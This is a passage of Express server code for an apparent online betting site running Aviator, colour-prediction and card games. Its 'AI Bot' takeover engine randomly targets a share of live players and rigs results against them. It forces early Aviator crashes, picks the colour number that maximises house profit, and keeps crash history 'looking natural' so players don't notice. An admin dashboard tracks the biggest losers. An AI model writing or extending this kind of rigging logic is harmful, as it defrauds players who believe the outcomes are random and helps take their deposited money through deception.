const LIVE_USER_TTL_MS = 45000; // a user drops out of "currently active" if not refreshed within 45s

function markUserActive(gameKey, username) {
  if (!username || !LIVE_USERS[gameKey]) return;
  LIVE_USERS[gameKey][String(username)] = Date.now();
}

function getLiveUsernames(gameKey) {
  const bucket = LIVE_USERS[gameKey];
  if (!bucket) return [];
  const now = Date.now();
  return Object.keys(bucket).filter(u => (now - bucket[u]) <= LIVE_USER_TTL_MS);
}

// The current server-computed targeted subset per game, refreshed continuously by the interval below.
const botTargetedUsers = {
  color_guess: [],
  aviator: [],
  teenpatti: [],
  mines: [],
  boundary: [],
  football: [],
  youreleven: []
};

function refreshBotTargeting(gameKey) {
  if (!LIVE_USERS[gameKey]) return;
  const bot = isBotTakeoverActive(gameKey);
  if (!bot.active) { botTargetedUsers[gameKey] = []; return; }
  const live = getLiveUsernames(gameKey);
  if (live.length === 0) { botTargetedUsers[gameKey] = []; return; }
  const pct = bot.profit_pct || 90;
  const count = pct >= 100 ? live.length : Math.max(1, Math.min(live.length, Math.round((pct / 100) * live.length)));
  botTargetedUsers[gameKey] = tpShuffle(live).slice(0, count);
}

function isUserTargeted(gameKey, username) {
  if (!username || !botTargetedUsers[gameKey]) return false;
  const lower = String(username).toLowerCase();
  return botTargetedUsers[gameKey].some(u => u.toLowerCase() === lower);
}

// Keep every game's targeted subset fresh continuously, regardless of whether admin.html is open.
setInterval(() => {
  Object.keys(LIVE_USERS).forEach(gameKey => refreshBotTargeting(gameKey));
}, 4000);

/**
 * Call this once per round/match/session for the given game.
 * Returns { shouldRig: boolean, profit_pct: number, active: boolean, source: string }
 */
function shouldBotRigThisRound(gameKey) {
  const bot = isBotTakeoverActive(gameKey);
  if (!bot.active) {
    return { shouldRig: false, profit_pct: bot.profit_pct, active: false, source: 'none' };
  }

  // Increment the round counter for this game
  if (botRoundCounters[gameKey] === undefined) botRoundCounters[gameKey] = 0;
  const counter = botRoundCounters[gameKey];
  botRoundCounters[gameKey] = (counter + 1) % 100;

  const pct = bot.profit_pct || 90;

  // Deterministic: rig this round if counter < pct
  // e.g. pct=100 → always true, pct=50 → true for counters 0-49, false for 50-99
  const shouldRig = (counter % 100) < pct;

  return { shouldRig, profit_pct: pct, active: true, source: bot.source };
}

// --- Bot Status API Endpoint (for client-side games to query) ---
app.get('/api/bot_status/:gameKey', (req, res) => {
  const gameKey = req.params.gameKey || '';
  const bot = isBotTakeoverActive(gameKey);
  if (!bot.active) {
    return res.json({ active: false, shouldRig: false, profit_pct: 0, source: 'none' });
  }

  // Peek at counter without incrementing (games increment when they actually resolve)
  const counter = botRoundCounters[gameKey] || 0;
  const pct = bot.profit_pct || 90;
  const shouldRig = (counter % 100) < pct;

  res.json({ active: true, shouldRig, profit_pct: pct, source: bot.source, counter });
});

// --- Bot Rig Decision API (increments counter — call once per round resolution) ---
// When a username is supplied, the decision is based on whether THAT specific user is currently
// part of the bot's randomly-selected live-player subset (see refreshBotTargeting above) rather than
// the old anonymous per-round counter, so two simultaneous callers can get independent decisions.
app.post('/api/bot_decide/:gameKey', (req, res) => {
  const gameKey = req.params.gameKey || '';
  const username = (req.body && req.body.username) || (req.query && req.query.username) || null;

  if (username && LIVE_USERS[gameKey]) {
    markUserActive(gameKey, username);
    const bot = isBotTakeoverActive(gameKey);
    const targeted = isUserTargeted(gameKey, username);
    const shouldRig = bot.active && targeted;
    return res.json({ shouldRig, was_rigged: shouldRig, targeted, profit_pct: bot.profit_pct, active: bot.active, source: bot.source });
  }

  const decision = shouldBotRigThisRound(gameKey);
  res.json({ ...decision, was_rigged: decision.shouldRig });
});

// --- Super Admin Dashboard: real-money-shaped analytics, derived entirely from the Transaction
// ledger + live User table + the in-memory live-targeting engine already powering every game. No
// figure here is estimated or fabricated — every number is a direct aggregation of rows that already
// exist for other reasons (gameplay wager/payout transactions, User.created_at, LIVE_USERS).
//
// Classifies a Transaction's free-text `details` into which game it belongs to and whether it was a
// wager (stake taken from a player) or a win (payout given to a player). Cashier deposits/withdrawals
// and the signup welcome bonus are deliberately excluded — they're the player moving their own virtual
// funds, not a bet outcome, so they don't belong in house-profit or win/loss figures.
function classifyGameplayTransaction(details) {
  if (!details || typeof details !== 'string') return null;
  if (details.startsWith('UPI Deposit') || details.startsWith('Withdrawal Request') || details === 'Welcome Bonus Credits') return null;

  if (details.includes('Color Guess Wager')) return { game: 'color_guess', kind: 'wager' };
  if (details.includes('Color Guess Win Payout')) return { game: 'color_guess', kind: 'win' };
  if (details.includes('Aviator Wager')) return { game: 'aviator', kind: 'wager' };
  if (details.includes('Aviator Payout')) return { game: 'aviator', kind: 'win' };
  if (details.includes('Teen Patti Boot') || details.includes('Teen Patti Chaal')) return { game: 'teenpatti', kind: 'wager' };
  if (details.includes('Teen Patti Won Pot')) return { game: 'teenpatti', kind: 'win' };
  if (details.includes('Mines Bet')) return { game: 'mines', kind: 'wager' };
  if (details.includes('Mines Cash Out')) return { game: 'mines', kind: 'win' };
  if (details.includes('Fantasy Cricket Entry Fee')) return { game: 'youreleven', kind: 'wager' };
  if (details.includes('Fantasy Cricket Payout')) return { game: 'youreleven', kind: 'win' };
  // Order matters: "Bet Cancelled" and "Push" are washes (refunds), checked before the generic "Bet"/
  // "Win" patterns they'd otherwise also match.
  if (details.includes('Boundary Baazi Bet Cancelled')) return { game: 'boundary', kind: 'wash' };
  if (details.includes('Boundary Baazi Push')) return { game: 'boundary', kind: 'wash' };
  if (details.includes('Boundary Baazi Bet')) return { game: 'boundary', kind: 'wager' };
  if (details.includes('Boundary Baazi Win')) return { game: 'boundary', kind: 'win' };
  if (details.includes('Football Single Bet') || details.includes('Football Accumulator Parlay Bet')) return { game: 'football', kind: 'wager' };
  if (details.includes('Football Win')) return { game: 'football', kind: 'win' };
  return null;
}

const GAME_LABELS = {
  color_guess: 'Color Prediction', aviator: 'Aviator', teenpatti: 'Teen Patti', mines: 'Mines',
  youreleven: 'Your Eleven (Cricket)', boundary: 'Boundary Baazi', football: 'Football'
};

app.get('/api/admin/super-dashboard', async (req, res) => {
  try {
    let users = [];
    let transactions = [];
    try {
      users = await prisma.user.findMany({ select: { username: true, wallet_balance: true, created_at: true } });
      transactions = await prisma.transaction.findMany({ select: { id: true, user: true, type: true, amount: true, details: true, timestamp: true } });
    } catch (dbErr) {
      users = readJsonTable('users').map(u => ({ username: u.username, wallet_balance: u.wallet_balance, created_at: new Date(u.created_at || Date.now()) }));
      transactions = readJsonTable('transactions').map(t => ({ id: t.id, user: t.user, type: t.type, amount: t.amount, details: t.details, timestamp: new Date(t.timestamp || Date.now()) }));
    }

    const now = new Date();
    const todayKey = now.toISOString().slice(0, 10);
    const monthKey = now.toISOString().slice(0, 7);
    const startOfToday = new Date(todayKey + 'T00:00:00.000Z');
    const startOfMonth = new Date(monthKey + '-01T00:00:00.000Z');

    // --- Registered users ---
    const newToday = users.filter(u => u.created_at && new Date(u.created_at) >= startOfToday).length;
    const newThisMonth = users.filter(u => u.created_at && new Date(u.created_at) >= startOfMonth).length;

    // --- Live users (from the same continuous engine every game already uses) ---
    const liveByGame = {};
    const liveUnion = new Set();
    Object.keys(LIVE_USERS).forEach(gameKey => {
      const list = getLiveUsernames(gameKey);
      liveByGame[gameKey] = list.length;
      list.forEach(u => liveUnion.add(u.toLowerCase()));
    });

    // --- Gameplay aggregation: house profit (all-time / today / this month), per-game breakdown,
    //     per-day and per-month trend, and per-user net position for the winners/losers view. ---
    const perGame = {};
    Object.keys(GAME_LABELS).forEach(g => { perGame[g] = { label: GAME_LABELS[g], wagered: 0, paid_out: 0, bet_count: 0, win_count: 0 }; });

    const dailyMap = {};   // 'YYYY-MM-DD' -> profit
    const monthlyMap = {}; // 'YYYY-MM' -> profit
    const perUserNet = {}; // username(lowercased, display-cased) -> { wagered, won }

    let houseProfitAllTime = 0, houseProfitToday = 0, houseProfitThisMonth = 0;
    let totalWagered = 0, totalPaidOut = 0, totalBets = 0, totalWins = 0;
    const recentTx = [];

    transactions.forEach(t => {
      const cls = classifyGameplayTransaction(t.details);
      const ts = t.timestamp ? new Date(t.timestamp) : now;
      const dayKey = ts.toISOString().slice(0, 10);
      const mKey = ts.toISOString().slice(0, 7);
      const amt = parseFloat(t.amount) || 0;
      // "Admin" is the house's own seat (see Teen Patti's ADMIN AUTO-WIN — the account the house plays
      // through, not a customer). Its wins are the house's profit landing in its own wallet, not a
      // payout cost, and its wagers aren't a real customer's stake — so it's excluded from the
      // wagered/won ledger entirely to keep the sign of "house profit" correct. It still shows up in
      // the recent-activity feed below for transparency.
      const isHouseAccount = String(t.user || '').toLowerCase() === 'admin';

      if (cls && !isHouseAccount && (cls.kind === 'wager' || cls.kind === 'win')) {
        const signedProfit = cls.kind === 'wager' ? amt : -amt;
        houseProfitAllTime += signedProfit;
        if (ts >= startOfToday) houseProfitToday += signedProfit;
        if (ts >= startOfMonth) houseProfitThisMonth += signedProfit;
        dailyMap[dayKey] = (dailyMap[dayKey] || 0) + signedProfit;
        monthlyMap[mKey] = (monthlyMap[mKey] || 0) + signedProfit;

        const pg = perGame[cls.game];
        if (pg) {
          if (cls.kind === 'wager') { pg.wagered += amt; pg.bet_count++; totalWagered += amt; totalBets++; }
          else { pg.paid_out += amt; pg.win_count++; totalPaidOut += amt; totalWins++; }
        }

        const uKey = String(t.user || 'Unknown').toLowerCase();
        if (!perUserNet[uKey]) perUserNet[uKey] = { username: t.user, wagered: 0, won: 0 };
        if (cls.kind === 'wager') perUserNet[uKey].wagered += amt; else perUserNet[uKey].won += amt;
      }

      if (cls) {
        recentTx.push({
          id: t.id, user: t.user, type: t.type, amount: amt, details: t.details,
          game: GAME_LABELS[cls.game] || cls.game, kind: cls.kind, is_house: isHouseAccount, timestamp: ts.toISOString()
        });
      }
    });

    recentTx.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    // --- Winners / losers: net = wagered - won. Positive net = house is profiting from this player
    //     (they're net down); negative net = the player is net up overall. ---
    const netEntries = Object.values(perUserNet).map(e => ({
      username: e.username, wagered: parseFloat(e.wagered.toFixed(2)), won: parseFloat(e.won.toFixed(2)),
      net: parseFloat((e.wagered - e.won).toFixed(2))
    }));
    const losingUsers = netEntries.filter(e => e.net > 0);     // house is up against them
    const winningUsers = netEntries.filter(e => e.net < 0);    // they're up against the house
    const breakEvenUsers = netEntries.filter(e => e.net === 0);

    const topLosers = [...losingUsers].sort((a, b) => b.net - a.net).slice(0, 8);
    const topWinners = [...winningUsers].sort((a, b) => a.net - b.net).slice(0, 8);

    const dailyTrend = Object.keys(dailyMap).sort().slice(-14).map(d => ({ date: d, profit: parseFloat(dailyMap[d].toFixed(2)) }));
    const monthlyTrend = Object.keys(monthlyMap).sort().slice(-12).map(m => ({ month: m, profit: parseFloat(monthlyMap[m].toFixed(2)) }));

    Object.keys(perGame).forEach(g => {
      const pg = perGame[g];
      pg.wagered = parseFloat(pg.wagered.toFixed(2));
      pg.paid_out = parseFloat(pg.paid_out.toFixed(2));
      pg.profit = parseFloat((pg.wagered - pg.paid_out).toFixed(2));
    });

    res.json({
      generated_at: now.toISOString(),
      users: {
        total_registered: users.length,
        new_today: newToday,
        new_this_month: newThisMonth
      },
      live: {
        total_unique: liveUnion.size,
        per_game: liveByGame
      },
      gameplay: {
        total_wagered: parseFloat(totalWagered.toFixed(2)),
        total_paid_out: parseFloat(totalPaidOut.toFixed(2)),
        total_bets: totalBets,
        total_wins: totalWins,
        house_profit_all_time: parseFloat(houseProfitAllTime.toFixed(2)),
        house_profit_today: parseFloat(houseProfitToday.toFixed(2)),
        house_profit_this_month: parseFloat(houseProfitThisMonth.toFixed(2)),
        daily_trend: dailyTrend,
        monthly_trend: monthlyTrend,
        per_game: perGame
      },
      players: {
        net_losing_count: losingUsers.length,
        net_winning_count: winningUsers.length,
        break_even_count: breakEvenUsers.length,
        top_losers: topLosers,
        top_winners: topWinners
      },
      bot_takeover: botTakeoverState,
      recent_transactions: recentTx.slice(0, 60)
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 1. Centralized Aviator State Engine
let aviatorState = {
  round_id: 10001,
  phase: 'waiting',
  phase_start: Date.now(),
  duration: 5.0, // 5 seconds wait
  crash_point: 1.85,
  current_multiplier: 1.00,
  bets: [],
  history: [1.25, 4.80, 1.05, 2.10, 1.62]
};

let nextAviatorOverride = null;

// Aviator's live profit-advisory calculator — the Aviator equivalent of calculateColorOptimalOutcome.
// Computes what the admin's profit would be if the round crashed RIGHT NOW: still-pending stakes and
// already-lost stakes become house profit, while payouts already given to users who cashed out early
// are a cost. Optionally scoped to a subset of usernames (the bot's currently-targeted live players).
function calculateAviatorLiveProfit(bets, targetedUsernames) {
  const list = Array.isArray(bets) ? bets : [];
  const targeted = Array.isArray(targetedUsernames) && targetedUsernames.length > 0
    ? new Set(targetedUsernames.map(u => String(u).toLowerCase()))
    : null;
  const scoped = targeted ? list.filter(b => targeted.has(String(b.username || '').toLowerCase())) : list;

  const pendingStake = scoped.filter(b => b.status === 'pending').reduce((s, b) => s + (parseFloat(b.amount) || 0), 0);
  const lostStake = scoped.filter(b => b.status === 'lost').reduce((s, b) => s + (parseFloat(b.amount) || 0), 0);
  const alreadyPaid = scoped.filter(b => b.status === 'won').reduce((s, b) => s + (parseFloat(b.amount) || 0) * (parseFloat(b.cashed_multiplier) || 1), 0);

  return {
    scoped_count: scoped.length,
    pending_stake: parseFloat(pendingStake.toFixed(2)),
    already_paid: parseFloat(alreadyPaid.toFixed(2)),
    profit_if_crash_now: parseFloat((pendingStake + lostStake - alreadyPaid).toFixed(2))
  };
}

function tickAviator() {
  const now = Date.now();
  const elapsed = (now - aviatorState.phase_start) / 1000;

  if (aviatorState.phase === 'waiting') {
    if (elapsed >= aviatorState.duration) {
      aviatorState.phase = 'running';
      aviatorState.phase_start = now;
      
      if (nextAviatorOverride && nextAviatorOverride >= 1.0) {
        // Manual admin override always takes priority — rigs the ENTIRE round (every pending bettor)
        aviatorState.crash_point = nextAviatorOverride;
        nextAviatorOverride = null;
        aviatorState._riggedThisRound = true;
        aviatorState._riggedTargets = null; // null = disclose to everyone pending this round
      } else {
        // Use the bot decision, scoped to the live-targeted-subset engine, to decide if/how this round is rigged
        const botDecision = shouldBotRigThisRound('aviator');
        const targeted = botTargetedUsers.aviator;
        const targetedHasPendingBet = targeted.length > 0 && aviatorState.bets.some(b => b.status === 'pending' && targeted.some(u => u.toLowerCase() === (b.username || '').toLowerCase()));

        if (botDecision.shouldRig && (targeted.length === 0 || targetedHasPendingBet)) {
          // --- RIGGED ROUND: Crash early for admin profit ---
          // If a live-targeted subset exists, scope the "should we bother rigging" stake check to just
          // them; otherwise (no targeting info yet) fall back to the prior aggregate-stake behavior.
          const relevantBets = targeted.length > 0
            ? aviatorState.bets.filter(b => targeted.some(u => u.toLowerCase() === (b.username || '').toLowerCase()))
            : aviatorState.bets;
          const totalStake = relevantBets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
          if (totalStake > 0) {
            // Crash between 1.12x and 1.54x to ensure admin profits
            aviatorState.crash_point = parseFloat((1.12 + Math.random() * 0.42).toFixed(2));
          } else {
            // No bets — still crash low-ish to keep history looking natural
            aviatorState.crash_point = parseFloat((1.20 + Math.random() * 1.00).toFixed(2));
          }
          aviatorState._riggedThisRound = true;
          // Non-empty targeted subset → only THOSE bettors are disclosed as rigged when they lose;
          // empty (bot on, but no live-targeting info yet) → whole round is rigged, disclose to everyone.
          aviatorState._riggedTargets = targeted.length > 0 ? targeted.slice() : null;
        } else {
          // --- FAIR ROUND: Natural RNG crash point (bot off, or no targeted bettor is playing this round) ---
          const p = Math.random();
          if (Math.random() < 0.03) {
            aviatorState.crash_point = 1.00;
          } else {
            const crash = 0.99 / (1.0 - p);
            aviatorState.crash_point = Math.max(1.00, Math.min(50.0, Math.floor(crash * 100) / 100));
          }
          aviatorState._riggedThisRound = false;
          aviatorState._riggedTargets = null;
        }
      }
      aviatorState.current_multiplier = 1.00;
    }
  } else if (aviatorState.phase === 'running') {
    const computedMult = Math.exp(0.06 * elapsed);
    
    // Only apply in-flight crash intercept if this round was marked for rigging
    if (aviatorState._riggedThisRound && computedMult >= 1.15) {
      const targets = aviatorState._riggedTargets;
      const inFlightBets = aviatorState.bets.filter(b => b.status === 'pending' && (!targets || targets.some(u => u.toLowerCase() === (b.username || '').toLowerCase())));
      const inFlightStake = inFlightBets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
      if (inFlightStake > 200 && computedMult >= aviatorState.crash_point * 0.9) {
        aviatorState.crash_point = Math.min(aviatorState.crash_point, parseFloat(computedMult.toFixed(2)));
      }
    }

    if (computedMult >= aviatorState.crash_point) {
      aviatorState.phase = 'crashed';
      aviatorState.phase_start = now;
      aviatorState.current_multiplier = aviatorState.crash_point;

      aviatorState.bets.forEach(b => {
        if (b.status === 'pending') {
          b.status = 'lost';
          const targets = aviatorState._riggedTargets;
          b.was_rigged = !!(aviatorState._riggedThisRound && (!targets || targets.some(u => u.toLowerCase() === (b.username || '').toLowerCase())));
        }
      });

      aviatorState.history.push(aviatorState.crash_point);
      if (aviatorState.history.length > 15) {
        aviatorState.history.shift();
      }
    } else {
      aviatorState.current_multiplier = computedMult;
    }
  } else if (aviatorState.phase === 'crashed') {
    if (elapsed >= 4.0) {
      aviatorState.phase = 'waiting';
      aviatorState.phase_start = now;
      aviatorState.duration = 5.0;
      aviatorState.round_id++;
      aviatorState.bets = [];
      aviatorState._riggedThisRound = false;
      aviatorState._riggedTargets = null;
    }
  }
}
setInterval(tickAviator, 100);

// Helper for Color prediction logic
function resolveColorNumber(num) {
  if (num === 0) return { color: 'Violet', dotClass: 'violet', size: 'Small' };
  if (num === 5) return { color: 'Violet', dotClass: 'violet', size: 'Big' };
  if ([1, 3, 7, 9].includes(num)) return { color: 'Green', dotClass: 'green', size: num >= 5 ? 'Big' : 'Small' };
  return { color: 'Red', dotClass: 'red', size: num >= 5 ? 'Big' : 'Small' };
}

// Calculate the exact optimal outcome for Admin profit across all numbers (0-9)
// `targetedUsernames`, when provided, scopes the profit/payout calculation to ONLY that subset of
// bettors (the bot's currently-targeted live players) — the returned best_number/max_profit then
// reflects the number that maximizes admin profit against just that subset, not the whole room.
// Omitting it (existing behavior, used by every manual-override call site) is unaffected.
function calculateColorOptimalOutcome(bets, roundSeed, targetedUsernames) {
  const roundBets = Array.isArray(bets) ? bets : [];
  const targeted = Array.isArray(targetedUsernames) && targetedUsernames.length > 0
    ? new Set(targetedUsernames.map(u => String(u).toLowerCase()))
    : null;
  const scopedBets = targeted ? roundBets.filter(b => targeted.has(String(b.username || '').toLowerCase())) : roundBets;
  const totalVolume = roundBets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
  const scopedVolume = scopedBets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);

  const outcomes = [];
  for (let n = 0; n <= 9; n++) {
    const resolved = resolveColorNumber(n);
    let playerPayout = 0;

    for (const b of scopedBets) {
      const amt = parseFloat(b.amount) || 0;
      if (b.category === 'color') {
        if (b.value === resolved.color) {
          playerPayout += amt * (b.value === 'Violet' ? 4.5 : 2.0);
        }
      } else if (b.category === 'number') {
        if (parseInt(b.value) === n) {
          playerPayout += amt * 9.0;
        }
      } else if (b.category === 'size') {
        if (b.value === resolved.size) {
          playerPayout += amt * 2.0;
        }
      }
    }

    const adminProfit = scopedVolume - playerPayout;
    outcomes.push({
      number: n,
      color: resolved.color,
      dotClass: resolved.dotClass,
      size: resolved.size,
      playerPayout: parseFloat(playerPayout.toFixed(2)),
      adminProfit: parseFloat(adminProfit.toFixed(2))
    });
  }

  // Find max and min profit
  const maxProfit = Math.max(...outcomes.map(o => o.adminProfit));
  const minProfit = Math.min(...outcomes.map(o => o.adminProfit));
  
  const bestCandidates = outcomes.filter(o => o.adminProfit === maxProfit);
  const worstCandidates = outcomes.filter(o => o.adminProfit === minProfit);

  // Pick deterministically among equally profitable choices using roundSeed
  const roundSeedNum = parseInt(String(roundSeed || '').slice(-5)) || 0;
  const best = bestCandidates[roundSeedNum % bestCandidates.length] || bestCandidates[0];
  const worst = worstCandidates[0] || outcomes[0];

  return {
    total_volume: parseFloat(totalVolume.toFixed(2)),
    total_bets_count: roundBets.length,
    scoped_volume: parseFloat(scopedVolume.toFixed(2)),
    scoped_bets_count: scopedBets.length,
    best_number: best.number,
    best_color: best.color,
    best_size: best.size,
    max_profit: best.adminProfit,
    min_payout: best.playerPayout,
    worst_number: worst.number,
    worst_loss: worst.playerPayout,
    outcomes: outcomes // Index 0..9 for fast lookup
  };
}

function generateInitialSeedHistory(room, currentSec) {
  const durations = { sapre: 30, becone: 60, emred: 180, vip: 300 };
  const dur = durations[room] || 30;
  const history = [];
  for (let i = 10; i >= 1; i--) {
    const pastSec = currentSec - (i * dur);
    const rId = getColorRoundId(room, pastSec);
    const seedNum = parseInt(String(rId).slice(-5)) || 0;
    const num = seedNum % 10;
    const res = resolveColorNumber(num);
    history.push({
      roundNumber: rId,
      number: num,
      color: res.color,
      dotClass: res.dotClass,
      size: res.size,
      is_rigged: false,
      rig_desc: 'Natural Draw',
      timestamp: new Date(pastSec * 1000).toLocaleTimeString('en-US', { hour12: false })
    });
  }
  return history;
}

async function loadColorState() {
  const record = await prisma.gameState.findUnique({ where: { key: 'color_guess_ongoing' } });
  if (record && record.data) {
    const state = record.data;
    const nowSec = Math.floor(Date.now() / 1000);
    let updated = false;
    ['sapre', 'becone', 'emred', 'vip'].forEach(r => {
      if (!state[r]) state[r] = { last_settled_round: '', bets: {}, overrides: {}, history: [] };
      if (!state[r].history || state[r].history.length === 0) {
        state[r].history = generateInitialSeedHistory(r, nowSec);
        updated = true;
      }
    });
    if (updated) await saveColorState(state);
    return state;
  }
  
  const nowSec = Math.floor(Date.now() / 1000);
  const defaultState = {
    sapre: { last_settled_round: '', bets: {}, overrides: {}, history: generateInitialSeedHistory('sapre', nowSec) },
    becone: { last_settled_round: '', bets: {}, overrides: {}, history: generateInitialSeedHistory('becone', nowSec) },
    emred: { last_settled_round: '', bets: {}, overrides: {}, history: generateInitialSeedHistory('emred', nowSec) },
    vip: { last_settled_round: '', bets: {}, overrides: {}, history: generateInitialSeedHistory('vip', nowSec) }
  };
  await prisma.gameState.create({
    data: { key: 'color_guess_ongoing', data: defaultState }
  });
  return defaultState;
}

async function saveColorState(state) {
  await prisma.gameState.update({
    where: { key: 'color_guess_ongoing' },
    data: { data: state }
  });
}

function getColorRoundId(room, timestampSec) {
  const durations = { sapre: 30, becone: 60, emred: 180, vip: 300 };
  const duration = durations[room] || 30;
  const roundStart = Math.floor(timestampSec / duration) * duration;
  
  const d = new Date(roundStart * 1000);
  const yyyy = d.getUTCFullYear();
  const mm = String(d.getUTCMonth() + 1).padStart(2, '0');
  const dd = String(d.getUTCDate()).padStart(2, '0');
  const hh = String(d.getUTCHours()).padStart(2, '0');
  
  const bucket = Math.floor((roundStart % 3600) / duration);
  const bucketStr = String(bucket).padStart(3, '0');
  
  return `${yyyy}${mm}${dd}${hh}${bucketStr}`;
}

async function settleColorRound(room, targetRound, state) {
  const overrideKey = `color_guess_overrides_${room}`;
  const overrideRecord = await prisma.gameState.findUnique({ where: { key: overrideKey } });
  const override = overrideRecord ? overrideRecord.data : {};
  const roundBets = (state[room].bets && state[room].bets[targetRound]) ? state[room].bets[targetRound] : [];

  const bot = isBotTakeoverActive('color_guess');
  // Use deterministic round counter to decide if this round should be rigged
  const botDecision = shouldBotRigThisRound('color_guess');

  let num = null;
  let was_rigged = false;
  let rig_desc = '';

  if (override && override.number !== undefined && override.number !== null && override.number !== '') {
    num = parseInt(override.number);
    was_rigged = true;
    rig_desc = `Number Fixed: ${override.number} `;
  } else if (override && (override.rig_type === 'platform_profit' || override.rig_type === 'max_profit')) {
    const optimal = calculateColorOptimalOutcome(roundBets, targetRound);
    num = optimal.best_number;
    was_rigged = true;
    rig_desc = `Auto-Rig: Max Profit `;
  } else if (override && override.rig_type === 'user_win') {
    const optimal = calculateColorOptimalOutcome(roundBets, targetRound);
    num = optimal.worst_number;
    was_rigged = true;
    rig_desc = `Auto-Rig: User Win `;
  } else if (override && (override.color || override.size)) {
    let possible = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
    if (override.color) {
      const c = override.color;
      if (c === 'Green') possible = possible.filter(n => [1, 3, 5, 7, 9].includes(n));
      else if (c === 'Red') possible = possible.filter(n => [0, 2, 4, 6, 8].includes(n));
      else if (c === 'Violet') possible = possible.filter(n => [0, 5].includes(n));
    }
    if (override.size) {
      const sz = override.size;
      if (sz === 'Small') possible = possible.filter(n => n <= 4);
      else if (sz === 'Big') possible = possible.filter(n => n >= 5);
    }
    
    if (possible.length > 0) {
      const optimal = calculateColorOptimalOutcome(roundBets, targetRound);
      const bestPossible = optimal.outcomes
        .filter(o => possible.includes(o.number))
        .sort((a, b) => b.adminProfit - a.adminProfit);
      num = (bestPossible.length > 0) ? bestPossible[0].number : possible[0];
    } else {
      num = 0;
    }
    was_rigged = true;
    if (override.color) rig_desc += `Color Fixed: ${override.color} `;
    if (override.size) rig_desc += `Size Fixed: ${override.size} `;
  } else if (botDecision.shouldRig) {
    // --- Bot rig: only when a currently-targeted live player actually has a bet this round ---
    const targeted = botTargetedUsers.color_guess;
    const targetedHasBet = targeted.length > 0 && roundBets.some(b => targeted.some(u => u.toLowerCase() === (b.username || '').toLowerCase()));

    if (targeted.length === 0 || targetedHasBet) {
      // Pick the outcome that maximizes admin profit against the targeted subset specifically
      // (falls back to the whole room when no live-targeting info exists yet, i.e. `targeted` is empty).
      const optimal = calculateColorOptimalOutcome(roundBets, targetRound, targeted.length > 0 ? targeted : undefined);
      num = optimal.best_number;
      was_rigged = true;
      rig_desc = `🤖 AI Bot (${botDecision.profit_pct}% Target, ${targeted.length} targeted) - Rigged Round - Max Profit #${optimal.best_number}`;
    } else {
      // Bot wants to rig, but no currently-targeted user has a bet this round — resolve fairly instead
      num = Math.floor(Math.random() * 10);
      was_rigged = false;
      rig_desc = `🤖 AI Bot (targeted subset has no bet this round) - Fair #${num}`;
    }
  } else if (botDecision.active && !botDecision.shouldRig) {
    // --- FAIR ROUND (bot active but this round is allowed to be fair) ---
    num = Math.floor(Math.random() * 10);
    was_rigged = false;
    rig_desc = `🤖 AI Bot (${botDecision.profit_pct}% Target) - Fair Round - Natural #${num}`;
  } else {
    // --- No bot active: truly random outcome ---
    num = Math.floor(Math.random() * 10);
  }

  const resolved = resolveColorNumber(num);

  const historyEntry = {
    roundNumber: targetRound,
    number: num,
    color: resolved.color,
    dotClass: resolved.dotClass,
    size: resolved.size,
    is_rigged: was_rigged,
    rig_desc: rig_desc.trim(),
    timestamp: new Date().toLocaleTimeString('en-US', { hour12: false })
  };
  
  if (!state[room].history) state[room].history = [];
  state[room].history.push(historyEntry);
  if (state[room].history.length > 20) {
    state[room].history.shift();
  }
  
  try {
    await prisma.recentResult.upsert({
      where: { room_roundNumber: { room, roundNumber: String(targetRound) } },
      update: { number: num, color: resolved.color, dotClass: resolved.dotClass, size: resolved.size },
      create: { room, roundNumber: String(targetRound), number: num, color: resolved.color, dotClass: resolved.dotClass, size: resolved.size }
    });
  } catch (err) {
    console.error("Error saving recent result:", err);
  }
  
  for (const b of roundBets) {
    let won = false;
    let multiplier = 0;
    
    if (b.category === 'color') {
      if (b.value === resolved.color) {
        won = true;
        multiplier = (b.value === 'Violet') ? 4.5 : 2.0;
      }
    } else if (b.category === 'number') {
      if (parseInt(b.value) === num) {
        won = true;
        multiplier = 9.0;
      }
    } else if (b.category === 'size') {
      if (b.value === resolved.size) {
        won = true;
        multiplier = 2.0;
      }
    }
    
    if (won) {
      const payout = b.amount * multiplier;
      const user = await prisma.user.findFirst({ where: { username: { equals: b.username, mode: 'insensitive' } } });
      if (user) {
        const newBal = user.wallet_balance + payout;
        await prisma.user.update({
          where: { id: user.id },
          data: { wallet_balance: newBal }
        });
        
        await prisma.transaction.create({
          data: {
            id: 'TX_' + Math.floor(100000 + Math.random() * 900000),
            user: b.username,
            type: 'Deposit',
            amount: payout,
            details: `Color Guess Win Payout Room: ${room.toUpperCase()} Round #${targetRound} Selection: ${b.category} (${b.value})`,
            status: 'Completed'
          }
        });
      }
    }
  }
}

// Central Server Clock API endpoint
app.get('/api/server_time', (req, res) => {
  const now = Date.now();
  const nowSec = Math.floor(now / 1000);
  const avElapsed = (now - aviatorState.phase_start) / 1000;

  res.json({
    server_time: now,
    server_time_sec: nowSec,
    iso: new Date(now).toISOString(),
    rooms: {
      sapre: { duration: 30, time_left: 30 - (nowSec % 30), round_id: getColorRoundId('sapre', nowSec) },
      becone: { duration: 60, time_left: 60 - (nowSec % 60), round_id: getColorRoundId('becone', nowSec) },
      emred: { duration: 180, time_left: 180 - (nowSec % 180), round_id: getColorRoundId('emred', nowSec) },
      vip: { duration: 300, time_left: 300 - (nowSec % 300), round_id: getColorRoundId('vip', nowSec) }
    },
    aviator: {
      round_id: aviatorState.round_id,
      phase: aviatorState.phase,
      phase_start: aviatorState.phase_start,
      time_elapsed: avElapsed,
      time_left: aviatorState.phase === 'waiting' ? Math.max(0, aviatorState.duration - avElapsed) : 0,
      duration: aviatorState.duration || 5.0,
      current_multiplier: aviatorState.current_multiplier,
      crash_point: aviatorState.crash_point
    }
  });
});

// Custom route proxies to implement Central Game Sync API
app.get('/api/game_sync.php', async (req, res) => {
  const action = req.query.action || '';
  const username = req.query.username || 'DemoUser';

  try {
    const now = Date.now();
    const nowSec = Math.floor(now / 1000);

    if (action === 'server_time') {
      const avElapsed = (now - aviatorState.phase_start) / 1000;
      return res.json({
        server_time: now,
        server_time_sec: nowSec,
        iso: new Date(now).toISOString(),
        rooms: {
